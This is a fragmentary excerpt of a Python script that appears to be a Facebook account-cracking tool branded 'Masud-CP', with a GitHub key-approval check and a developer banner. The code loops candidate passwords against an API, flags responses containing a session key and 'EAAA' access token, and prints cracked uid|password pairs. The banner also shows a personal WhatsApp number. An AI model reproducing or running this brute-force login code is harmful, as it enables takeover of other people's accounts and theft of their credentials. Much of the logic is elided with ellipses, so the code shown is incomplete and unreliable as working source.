...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/skcayber/approval/blob/main/Masud-approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;91m ..
 ...
 > \033[0;96mDEVELOPER     : Masud
 > \033[0;96mFACEBOOK ID   : Masud Chowdhury 
 > \033[0;96mWHATSAPP      : 9607421489
 \033[0;96m> GITHUB        : Masud2544
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Masud): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[Masud-CP] %s|%s\033[0;97m         "%(uid, pw))
